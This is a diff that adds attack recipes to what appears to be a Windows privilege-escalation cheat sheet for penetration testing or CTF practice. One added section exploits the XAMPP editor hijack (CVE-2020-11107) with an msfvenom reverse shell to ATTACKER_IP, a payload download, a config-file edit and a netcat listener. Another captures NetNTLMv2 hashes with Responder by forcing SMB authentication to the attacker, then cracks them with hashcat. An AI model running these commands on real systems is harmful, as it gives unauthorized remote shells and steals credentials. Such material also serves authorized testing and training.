@@ -170,6 +170,62 @@ icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 - If BUILTIN\Users or Everyone has (F) or (M) on a service binary, replace it with a malicious one
 - `cmd /c copy /Y malicious.exe "C:\path\to\service.exe"` then `sc start ServiceName`
 
+### XAMPP Control Panel Editor Hijack
+
+XAMPP versions including `7.3.10` can be affected by the control-panel editor hijack tracked as CVE-2020-11107 / Exploit-DB `50337`.
+
+Check the XAMPP version:
+
+```cmd
+type C:\xampp\properties.ini
+```
+
+Useful indicator:
+
+```text
+base_stack_version=7.3.10-1
+```
+
+Create and transfer a reverse shell payload:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -o shell.exe -f exe
+```
+
+```powershell
+Invoke-WebRequest -Uri http://ATTACKER_IP:8000/shell.exe -UseBasicParsing -OutFile C:\Users\mike\Desktop\shell.exe
+```
+
+Replace the XAMPP control panel editor value with the payload path:
+
+```powershell
+$file = "C:\xampp\xampp-control.ini"
+$find = ((Get-Content $file)[2] -Split "=")[1]
+$replace = "C:\Users\mike\Desktop\shell.exe"
+(Get-Content $file) -replace $find, $replace | Set-Content $file
+```
+
+Confirm the value:
+
+```text
+[Common]
+Editor=C:\\Users\\mike\\desktop\\shell.exe
+```
+
+Start a listener and wait for the control panel to trigger the configured editor:
+
+```bash
+nc -nlvp 9001
+```
+
+Successful shell:
+
+```text
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
+Microsoft Windows [Version 10.0.19044.1645]
+C:\WINDOWS\system32>
+```
+
 ### Weak Service Permissions
 ```cmd
 accesschk.exe /accepteula -quvcw ServiceName
@@ -413,6 +469,32 @@ Command=ToggleDesktop
 - Name it `@Inventory.scf` and place on heavily used file share
 - Start Responder: `sudo responder -wrf -v -I tun0`
 - Crack captured NTLMv2: `hashcat -m 5600 hash.txt rockyou.txt`
+
+### Force SMB Authentication From a Shell
+
+If you already have command execution as a Windows user, force that user to authenticate to your SMB listener:
+
+```bash
+sudo responder -I tun0
+```
+
+```cmd
+dir \\ATTACKER_IP\share
+```
+
+Responder should capture NetNTLMv2:
+
+```text
+[SMB] NTLMv2-SSP Client   : TARGET
+[SMB] NTLMv2-SSP Username : HOST\User
+[SMB] NTLMv2-SSP Hash     : User::HOST:...
+```
+
+Crack it with Hashcat mode `5600`:
+
+```bash
+hashcat -a0 -m 5600 hash.txt /opt/rockyou.txt
+```
 
 ### Process Command Line Monitoring
 ```powershell
